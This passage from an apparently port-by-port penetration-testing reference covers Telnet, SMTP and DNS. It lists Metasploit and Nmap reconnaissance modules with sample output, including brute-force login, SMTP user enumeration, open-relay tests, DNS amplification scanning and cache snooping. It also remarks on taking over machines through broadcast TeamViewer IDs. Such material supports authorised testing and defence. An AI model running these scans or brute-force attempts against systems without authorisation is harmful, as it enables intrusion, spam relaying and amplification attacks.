<h4>Telnet version<a class="headerlink" href="#telnet-version" title="Link to this heading"></a></h4>
<p>Detect telnet version.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/telnet/telnet_version</span>
<span class="go">services -p 23 -u -R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.13.xx.xx:23 TELNET (ttyp0)\x0d\x0a\x0d\x0alogin:</span>
<span class="go">[*] 10.13.xx.xx:23 TELNET User Access Verification\x0a\x0aUsername:</span>
</pre></div>
</div>
<p>One sad thing is telnet_version overwrites the Nmap banner, which is most probably not good. Need to check how we can avoid this. maybe not run version modules?</p>
<p>We could have used nmap banners for telnet for example: below for the SNMP modules. As routers/ switches are mostly uses SNMP.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">10.23.xx.xx   23    tcp    telnet      open   Usually a Cisco/3com switch</span>
<span class="go">10.23.xx.xx   23    tcp    telnet      open   Aruba switch telnetd</span>
<span class="go">10.87.xx.xx   23    tcp    telnet      open   Dell PowerConnect switch telnetd</span>
<span class="go">10.10.xx.xx   23    tcp    telnet      open   Cisco router telnetd</span>
<span class="go">10.10.xx.xx   23    tcp    telnet      open   Pirelli NetGate VOIP v2 broadband router telnetd</span>
</pre></div>
</div>
</section>
<section id="telnet-login-check-scanner">
<h4>Telnet Login Check Scanner<a class="headerlink" href="#telnet-login-check-scanner" title="Link to this heading"></a></h4>
<p>Test a telnet login on a range of machines and report successful logins.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/telnet/telnet_login</span>
<span class="go">services -p 23 -u -R</span>
</pre></div>
</div>
</section>
</section>
<section id="id4">
<h3>Nmap<a class="headerlink" href="#id4" title="Link to this heading"></a></h3>
<p>Two NSEs</p>
<section id="telnet-brute">
<h4>Telnet-brute<a class="headerlink" href="#telnet-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/telnet-brute.html">telnet-brute.nse</a> : Performs brute-force password auditing against telnet servers.</p>
<p>and</p>
</section>
<section id="telnet-encryption">
<h4>Telnet-encryption<a class="headerlink" href="#telnet-encryption" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/telnet-encryption.html">telnet-encryption.nse</a> : Determines whether the encryption option is supported on a remote telnet server.</p>
</section>
</section>
</section>
<section id="port-25-smtp-port-587-submission">
<span id="smtp-port-25-and-submission-port-587"></span><h2>Port 25 - SMTP | Port 587 - Submission<a class="headerlink" href="#port-25-smtp-port-587-submission" title="Link to this heading"></a></h2>
<section id="id5">
<h3>Metasploit<a class="headerlink" href="#id5" title="Link to this heading"></a></h3>
<section id="smtp-version">
<h4>SMTP_Version<a class="headerlink" href="#smtp-version" title="Link to this heading"></a></h4>
<p>SMTP Banner Grabber.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/smtp/smtp_version</span>
<span class="go">services -p 25 -u -R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:25 SMTP 220 xxxx.example.com Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:22:44 +0530 \x0d\x0a</span>
<span class="go">[*] 10.10.xx.xx:25 SMTP 220 smtpsrv.example.com ESMTP Sendmail; Thu, 3 Mar 2016 18:22:39 +0530\x0d\x0a</span>
</pre></div>
</div>
</section>
<section id="smtp-open-relays">
<h4>SMTP Open Relays<a class="headerlink" href="#smtp-open-relays" title="Link to this heading"></a></h4>
<p>Tests if an SMTP server will accept (via a code 250) an e-mail by using a variation of testing methods</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/smtp/smtp_relay</span>
<span class="go">services -p 25 -u -R</span>
</pre></div>
</div>
<p>You might want to change MAILFROM and MAILTO, if you want to see if they are actual open relays client might receive emails.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:&lt;sender@example.com&gt; -&gt; RCPT TO:&lt;target@example.com&gt;</span>
<span class="go">[*] 172.16.xx.xx:25 - No relay detected</span>
<span class="go">[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:&lt;sender@example.com&gt; -&gt; RCPT TO:&lt;target@example.com&gt;</span>
</pre></div>
</div>
</section>
<section id="smtp-user-enumeration-utility">
<h4>SMTP User Enumeration Utility<a class="headerlink" href="#smtp-user-enumeration-utility" title="Link to this heading"></a></h4>
<p>Allows the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/smtp/smtp_enum</span>
<span class="go">services -p 25 -u -R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:25 Skipping microsoft (220 ftpsrv Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:49:49 +0530)</span>
<span class="go">[+] 10.10.xx.xx:25 Users found: adm, admin, avahi, avahi-autoipd, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www</span>
</pre></div>
</div>
</section>
</section>
<section id="nmap-nse">
<h3>Nmap NSE<a class="headerlink" href="#nmap-nse" title="Link to this heading"></a></h3>
<section id="smtp-brute">
<h4>SMTP-brute<a class="headerlink" href="#smtp-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-brute.html">smtp-brute.nse</a> : Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.</p>
</section>
<section id="smtp-commands">
<h4>SMTP-Commands<a class="headerlink" href="#smtp-commands" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-commands.html">smtp-commands.nse</a> : Attempts to use EHLO and HELP to gather the Extended commands supported by an SMTP server.</p>
</section>
<section id="smtp-enum-users">
<h4>SMTP-enum-users<a class="headerlink" href="#smtp-enum-users" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-enum-users.html">smtp-enum-users.nse</a> : Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO commands. The goal of this script is to discover all the user accounts in the remote system. Similar to SMTP_ENUM in metasploit.</p>
</section>
<section id="smtp-open-relay">
<h4>SMTP-open-relay<a class="headerlink" href="#smtp-open-relay" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-open-relay.html">smtp-open-relay.nse</a> : Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal of this script is to tell if a SMTP server is vulnerable to mail relaying.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -iL email_servers -v --script=smtp-open-relay -p 25</span>
<span class="go">Nmap scan report for 10.10.xx.xx</span>
<span class="go">Host is up (0.00039s latency).</span>
<span class="go">PORT     STATE  SERVICE</span>
<span class="go">25/tcp   open   smtp</span>
<span class="go">| smtp-open-relay: Server is an open relay (14/16 tests)</span>
<span class="go">|  MAIL FROM:&lt;&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@sysmailsrv.example.com&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[10.10.8.136]&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@sysmailsrv.example.com&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;&quot;relaytest@nmap.scanme.org&quot;&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;&quot;relaytest%nmap.scanme.org&quot;&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;&quot;relaytest@nmap.scanme.org&quot;@[10.10.8.136]&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@[10.10.8.136]:relaytest@nmap.scanme.org&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@sysmailsrv.example.com:relaytest@nmap.scanme.org&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;</span>
<span class="go">|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[10.10.8.136]&gt;</span>
<span class="go">|_ MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@sysmailsrv.example.com&gt;</span>
<span class="go">MAC Address: 00:50:56:B2:21:A9 (VMware)</span>
</pre></div>
</div>
</section>
</section>
<section id="other">
<h3>Other<a class="headerlink" href="#other" title="Link to this heading"></a></h3>
<section id="id6">
<h4>SMTP Commands<a class="headerlink" href="#id6" title="Link to this heading"></a></h4>
<p>SMTP supports the below commands:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ATRN   Authenticated TURN</span>
<span class="go">AUTH   Authentication</span>
<span class="go">BDAT   Binary data</span>
<span class="go">BURL   Remote content</span>
<span class="go">DATA   The actual email message to be sent. This command is terminated with a line that contains only a .</span>
<span class="go">EHLO   Extended HELO</span>
<span class="go">ETRN   Extended turn</span>
<span class="go">EXPN   Expand</span>
<span class="go">HELO   Identify yourself to the SMTP server.</span>
<span class="go">HELP   Show available commands</span>
<span class="go">MAIL   Send mail from email account</span>
<span class="go">MAIL FROM: me@mydomain.com</span>
<span class="go">NOOP   No-op. Keeps you connection open.</span>
<span class="go">ONEX   One message transaction only</span>
<span class="go">QUIT   End session</span>
<span class="go">RCPT   Send email to recipient</span>
<span class="go">RCPT TO: you@yourdomain.com</span>
<span class="go">RSET   Reset</span>
<span class="go">SAML   Send and mail</span>
<span class="go">SEND   Send</span>
<span class="go">SOML   Send or mail</span>
<span class="go">STARTTLS</span>
<span class="go">SUBMITTER      SMTP responsible submitter</span>
<span class="go">TURN   Turn</span>
<span class="go">VERB   Verbose</span>
<span class="go">VRFY   Verify</span>
</pre></div>
</div>
<p>The following is an actual SMTP session. All sessions must start with HELO and end with QUIT.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">HELO my.server.com</span>
<span class="go">MAIL FROM: &lt;me@mydomain.com&gt;</span>
<span class="go">RCPT TO: &lt;you@yourdomain.com&gt;</span>
<span class="go">DATA</span>
<span class="go">From: Danny Dolittle</span>
<span class="go">To: Sarah Smith</span>
<span class="go">Subject: Email sample</span>
<span class="go">Mime-Version: 1.0</span>
<span class="go">Content-Type: text/plain; charset=us-ascii</span>

<span class="go">This is a test email for you to read.</span>
<span class="go">.</span>
<span class="go">QUIT</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-53-dns">
<span id="dns-port-53"></span><h2>Port 53 - DNS<a class="headerlink" href="#port-53-dns" title="Link to this heading"></a></h2>
<section id="id7">
<h3>Metasploit<a class="headerlink" href="#id7" title="Link to this heading"></a></h3>
<section id="dns-bruteforce-enumeration">
<h4>DNS Bruteforce Enumeration<a class="headerlink" href="#dns-bruteforce-enumeration" title="Link to this heading"></a></h4>
<p>Uses a dictionary to perform a bruteforce attack to enumerate hostnames and subdomains available under a given domain</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/gather/dns_bruteforce</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] Host autodiscover.example.com with address 10.10.xx.xx found</span>
<span class="go">[+] Host b2b.example.com with address 10.10.xx.xx found</span>
<span class="go">[+] Host blog.example.com with address 10.10.xx.xx found</span>
</pre></div>
</div>
</section>
<section id="dns-basic-information-enumeration">
<h4>DNS Basic Information Enumeration<a class="headerlink" href="#dns-basic-information-enumeration" title="Link to this heading"></a></h4>
<p>Module enumerates basic DNS information for a given domain. The module gets information regarding to A (addresses), AAAA (IPv6 addresses), NS (name servers), SOA (start of authority) and MX (mail servers) records for a given domain. In addition, this module retrieves information stored in TXT records.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/gather/dns_info</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Enumerating example.com</span>
<span class="go">[+] example.com - Address 93.184.xx.xx found. Record type: A</span>
<span class="go">[+] example.com - Address 2606:2800:220:1:248:1893:25c8:1946 found. Record type: AAAA</span>
<span class="go">[+] example.com - Name server a.iana-servers.net (199.43.xx.xx) found. Record type: NS</span>
<span class="go">[+] example.com - Name server a.iana-servers.net (2001:500:8c::53) found. Record type: NS</span>
<span class="go">[+] example.com - Name server b.iana-servers.net (199.43.xx.xx) found. Record type: NS</span>
<span class="go">[+] example.com - Name server b.iana-servers.net (2001:500:8d::53) found. Record type: NS</span>
<span class="go">[+] example.com - sns.dns.icann.org (199.4.xx.xx) found. Record type: SOA</span>
<span class="go">[+] example.com - sns.dns.icann.org (64:ff9b::c704:1c1a) found. Record type: SOA</span>
<span class="go">[+] example.com - Text info found: v=spf1 -all . Record type: TXT</span>
<span class="go">[+] example.com - Text info found: $Id: example.com 4415 2015-08-24 20:12:23Z davids $ . Record type: TXT</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
<section id="dns-reverse-lookup-enumeration">
<h4>DNS Reverse Lookup Enumeration<a class="headerlink" href="#dns-reverse-lookup-enumeration" title="Link to this heading"></a></h4>
<p>Module performs DNS reverse lookup against a given IP range in order to retrieve valid addresses and names.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/gather/dns_reverse_lookup</span>
</pre></div>
</div>
</section>
<section id="dns-common-service-record-enumeration">
<h4>DNS Common Service Record Enumeration<a class="headerlink" href="#dns-common-service-record-enumeration" title="Link to this heading"></a></h4>
<p>Module enumerates common DNS service records in a given domain.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/gather/dns_srv_enum</span>
<span class="go">set domain example.com</span>
<span class="go">run</span>

<span class="go">[*] Enumerating SRV Records for example.com</span>
<span class="go">[+] Host: sipfed.online.lync.com IP: 10.10.xx.xx Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com</span>
<span class="go">[+] Host: sipfed.online.lync.com IP: 2a01:XXX:XXXX:2::b Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
<section id="dns-record-scanner-and-enumerator">
<h4>DNS Record Scanner and Enumerator<a class="headerlink" href="#dns-record-scanner-and-enumerator" title="Link to this heading"></a></h4>
<p>Module can be used to gather information about a domain from a given DNS server by performing various DNS queries such as zone transfers, reverse lookups, SRV record bruteforcing, and other techniques.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/gather/enum_dns</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Setting DNS Server to zonetransfer.me NS: 81.4.xx.xx</span>
<span class="go">[*] Retrieving general DNS records</span>
<span class="go">[*] Domain: zonetransfer.me IP address: 217.147.xx.xx Record: A</span>
<span class="go">[*] Name: ASPMX.L.GOOGLE.COM. Preference: 0 Record: MX</span>
<span class="go">[*] Name: ASPMX3.GOOGLEMAIL.COM. Preference: 20 Record: MX</span>
<span class="go">[*] Name: ALT1.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX</span>
<span class="go">[*] Name: ASPMX5.GOOGLEMAIL.COM. Preference: 20 Record: MX</span>
<span class="go">[*] Name: ASPMX2.GOOGLEMAIL.COM. Preference: 20 Record: MX</span>
<span class="go">[*] Name: ASPMX4.GOOGLEMAIL.COM. Preference: 20 Record: MX</span>
<span class="go">[*] Name: ALT2.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX</span>
<span class="go">[*] zonetransfer.me.        301     IN      TXT</span>
<span class="go">[*] Text: zonetransfer.me.        301     IN      TXT</span>
<span class="go">[*] Performing zone transfer against all nameservers in zonetransfer.me</span>
<span class="go">[*] Testing nameserver: nsztm2.digi.ninja.</span>
<span class="go">W, [2016-04-05T22:53:16.834590 #15019]  WARN -- : AXFR query, switching to TCP</span>
<span class="go">W, [2016-04-05T22:53:17.490698 #15019]  WARN -- : Error parsing axfr response: undefined method `+&#39; for nil:NilClass</span>
<span class="go">W, [2016-04-05T22:53:32.047468 #15019]  WARN -- : Nameserver 167.88.xx.xx not responding within TCP timeout, trying next one</span>
<span class="go">F, [2016-04-05T22:53:32.047746 #15019] FATAL -- : No response from nameservers list: aborting</span>
<span class="go">[-] Zone transfer failed (length was zero)</span>
<span class="go">[*] Testing nameserver: nsztm1.digi.ninja.</span>
<span class="go">W, [2016-04-05T22:53:33.269318 #15019]  WARN -- : AXFR query, switching to TCP</span>
<span class="go">W, [2016-04-05T22:53:33.804121 #15019]  WARN -- : Error parsing axfr response: undefined method `+&#39; for nil:NilClass</span>
<span class="go">W, [2016-04-05T22:53:48.481319 #15019]  WARN -- : Nameserver 81.4.xx.xx not responding within TCP timeout, trying next one</span>
<span class="go">F, [2016-04-05T22:53:48.481519 #15019] FATAL -- : No response from nameservers list: aborting</span>
<span class="go">[-] Zone transfer failed (length was zero)</span>
<span class="go">[*] Enumerating SRV records for zonetransfer.me</span>
<span class="go">[*] SRV Record: _sip._tcp.zonetransfer.me Host: www.zonetransfer.me. Port: 5060 Priority: 0</span>
<span class="go">[*] Done</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
<p>Two interesting metasploit modules which we found are</p>
</section>
<section id="dns-amplification-scanner">
<h4>DNS Amplification Scanner<a class="headerlink" href="#dns-amplification-scanner" title="Link to this heading"></a></h4>
<p>Test for the DNS Amplification Tests.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auxiliary/scanner/dns/dns_amp</span>
<span class="go">services -p 53 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Sending 67 bytes to each host using the IN ANY isc.org request</span>
<span class="go">[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]</span>
<span class="go">[+] 10.10.xx.xx:53 - Response is 417 bytes [6.22x Amplification]</span>
<span class="go">[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]</span>
<span class="go">[+] 10.10.xx.xx:53 - Response is 230 bytes [3.43x Amplification]</span>
</pre></div>
</div>
</section>
<section id="dns-non-recursive-record-scraper">
<h4>DNS Non-Recursive Record Scraper<a class="headerlink" href="#dns-non-recursive-record-scraper" title="Link to this heading"></a></h4>
<p>Can be used to scrape records that have been cached by a specific nameserver. Thinking of what all can be discovered from this module is the antivirus softwares used by the company, websites visited by the employees. It uses dns norecurse option.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/gather/dns_cache_scraper</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Making queries against 103.8.xx.xx</span>
<span class="go">[+] dnl-01.geo.kaspersky.com - Found</span>
<span class="go">[+] downloads2.kaspersky-labs.com - Found</span>
<span class="go">[+] liveupdate.symantecliveupdate.com - Found</span>
<span class="go">[+] liveupdate.symantec.com - Found</span>
<span class="go">[+] update.symantec.com - Found</span>
<span class="go">[+] update.nai.com - Found</span>
<span class="go">[+] guru.avg.com - Found</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
</section>
<section id="id8">
<h3>Nmap<a class="headerlink" href="#id8" title="Link to this heading"></a></h3>
<p>Nmap has around 19-20 NSE Scripts for DNS, we haven’t mentioned all the NSE here, only which we were able to use.:</p>
<section id="broadcast-dns-service-discovery">
<h4>Broadcast-dns-service-discovery<a class="headerlink" href="#broadcast-dns-service-discovery" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html">broadcast-dns-service-discovery.nse</a> : Attempts to discover hosts’ services using the DNS Service Discovery protocol. It sends a multicast DNS-SD query and collects all the responses.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script=broadcast-dns-service-discovery</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-12 14:53 IST</span>
<span class="go">Pre-scan script results:</span>
<span class="go">| broadcast-dns-service-discovery:</span>
<span class="go">|   172.30.xx.xx</span>
<span class="go">|     9/tcp workstation</span>
<span class="go">|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b</span>
<span class="go">|     22/tcp udisks-ssh</span>
<span class="go">|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b</span>
<span class="go">|   172.30.xx.xx</span>
<span class="go">|     2020/tcp teamviewer</span>
<span class="go">|       DyngateID=164005815</span>
<span class="go">|       Token=CrzebHH5rkzIEBsP</span>
<span class="go">|       UUID=119e36d8-4366-4495-9e13-c44be02851f0</span>
<span class="go">|_      Address=172.30.xx.xx fe80:0:0:0:69ab:44d5:e21d:738e</span>
<span class="go">WARNING: No targets were specified, so 0 hosts scanned.</span>
<span class="go">Nmap done: 0 IP addresses (0 hosts up) scanned in 7.24 seconds</span>
</pre></div>
</div>
<p>It’s surprising why teamviewer will broadcast its ID, then we mostly need 4 digit pin just to control the machine.</p>
</section>
<section id="dns-blacklist">
<h4>DNS-blacklist<a class="headerlink" href="#dns-blacklist" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-blacklist.html">dns-blacklist.nse</a> (External IP Only) Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists and returns a list of services for which an IP has been flagged</p>
</section>
<section id="dns-brute">
<h4>DNS-brute<a class="headerlink" href="#dns-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-brute.html">dns-brute.nse</a> : This is similar to the msf dns_bruteforce module. Attempts to enumerate DNS hostnames by brute force guessing of common subdomains.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script dns-brute www.example.com -sn -n -Pn</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:23 IST</span>
<span class="go">Nmap scan report for www.example.com (116.50.xx.xx)</span>
<span class="go">Host is up.</span>
<span class="go">Other addresses for www.example.com (not scanned): 64:ff9b::7432:4fd0</span>

<span class="go">Host script results:</span>
<span class="go">| dns-brute:</span>
<span class="go">|   DNS Brute-force hostnames:</span>
<span class="go">|     mx1.example.com - 64:ff9b:0:0:0:0:cbc7:2989</span>
<span class="go">|     images.example.com - 116.50.xx.xx</span>
<span class="go">|     images.example.com - 64:ff9b:0:0:0:0:7432:404b</span>
<span class="go">|     dns.example.com - 116.50.xx.xx</span>
<span class="go">|     dns.example.com - 64:ff9b:0:0:0:0:7432:42e6</span>
<span class="go">|     web.example.com - 203.199.xx.xx</span>
<span class="go">|     web.example.com - 64:ff9b:0:0:0:0:cbc7:2911</span>
<span class="go">|     exchange.example.com - 203.199.xx.xx</span>
<span class="go">|     mail.example.com - 116.50.xx.xx</span>
<span class="go">|     exchange.example.com - 64:ff9b:0:0:0:0:cbc7:29a7</span>
<span class="go">|     mail.example.com - 64:ff9b:0:0:0:0:7432:4fe7</span>
<span class="go">|     blog.example.com - 116.50.xx.xx</span>
<span class="go">|     blog.example.com - 64:ff9b:0:0:0:0:7432:4ebb</span>
<span class="go">|     www.example.com - 116.50.xx.xx</span>
<span class="go">|     www.example.com - 64:ff9b:0:0:0:0:7432:4fd0</span>
<span class="go">|     sip.example.com - 116.50.xx.xx</span>
<span class="go">|     sip.example.com - 116.50.xx.xx</span>
<span class="go">|     sip.example.com - 64:ff9b:0:0:0:0:7432:4e56</span>
<span class="go">|     sip.example.com - 64:ff9b:0:0:0:0:7432:4ec9</span>
<span class="go">|     mobile.example.com - 116.50.xx.xx</span>
<span class="go">|_    mobile.example.com - 64:ff9b:0:0:0:0:7432:4e18</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds</span>
</pre></div>
</div>
</section>
<section id="dns-cache-snoop">
<h4>DNS-Cache-snoop<a class="headerlink" href="#dns-cache-snoop" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-cache-snoop.html">dns-cache-snoop.nse</a> : This module is similar to dns_cache_scraper. Perform DNS cache snooping against a DNS server. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with “www.” and once without. Use the dns-cache-snoop.domains script argument to use a different list.</p>
<p>Sample Output with no arguments:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sU -p 53 --script dns-cache-snoop.nse 103.8.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:30 IST</span>
<span class="go">Nmap scan report for ns5.xxxxxx.co.in (103.8.xx.xx)</span>
<span class="go">Host is up (0.067s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">53/udp open  domain</span>
<span class="go">| dns-cache-snoop: 83 of 100 tested domains are cached.</span>
<span class="go">| google.com</span>
<span class="go">| www.google.com</span>
<span class="go">| facebook.com</span>
<span class="go">| www.facebook.com</span>
<span class="go">| youtube.com</span>
<span class="go">| www.youtube.com</span>
<span class="go">| yahoo.com</span>
<span class="go">| www.yahoo.com</span>
</pre></div>
</div>
<p>Sample Output with custom list of websites:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sU -p 53 --script dns-cache-snoop.nse --script-args &#39;dns-cache-snoop.mode=timed,dns-cache-snoop.domains={dnl-01.geo.kaspersky.com,update.symantec.com,host3.com}&#39; 103.8.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:33 IST</span>
<span class="go">Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)</span>
<span class="go">Host is up (0.11s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">53/udp open  domain</span>
<span class="go">| dns-cache-snoop: 2 of 3 tested domains are cached.</span>
<span class="go">| dnl-01.geo.kaspersky.com</span>
<span class="go">|_update.symantec.com</span>
</pre></div>
</div>
</section>
<section id="dns-check-zone">
<h4>DNS-Check-zone<a class="headerlink" href="#dns-check-zone" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-check-zone.html">dns-check-zone.nse</a> :  Checks DNS zone configuration against best practices, including RFC 1912. The configuration checks are divided into categories which each have a number of different tests.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sn -Pn aster.example.co.in --script dns-check-zone --script-args=&#39;dns-check-zone.domain=example.com&#39;</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:33 IST</span>
<span class="go">Nmap scan report for aster.example.co.in (202.191.xx.xx)</span>
<span class="go">Host is up.</span>
<span class="go">Other addresses for aster.example.co.in (not scanned): 64:ff9b::cabf:9a42</span>
<span class="go">rDNS record for 202.191.xx.xx: segment-202-191.sify.net</span>
<span class="go">Host script results:</span>
<span class="go">| dns-check-zone:</span>
<span class="go">| DNS check results for domain: example.com</span>
<span class="go">|   MX</span>
<span class="go">|     PASS - Reverse MX A records</span>
<span class="go">|       All MX records have PTR records</span>
<span class="go">|   SOA</span>
<span class="go">|     PASS - SOA REFRESH</span>
<span class="go">|       SOA REFRESH was within recommended range (3600s)</span>
<span class="go">|     PASS - SOA RETRY</span>
<span class="go">|       SOA RETRY was within recommended range (600s)</span>
<span class="go">|     PASS - SOA EXPIRE</span>
<span class="go">|         SOA EXPIRE was within recommended range (1209600s)</span>
<span class="go">|     PASS - SOA MNAME entry check</span>
<span class="go">|       SOA MNAME record is listed as DNS server</span>
<span class="go">|     PASS - Zone serial numbers</span>
<span class="go">|       Zone serials match</span>
<span class="go">|   NS</span>
<span class="go">|     FAIL - Recursive queries</span>
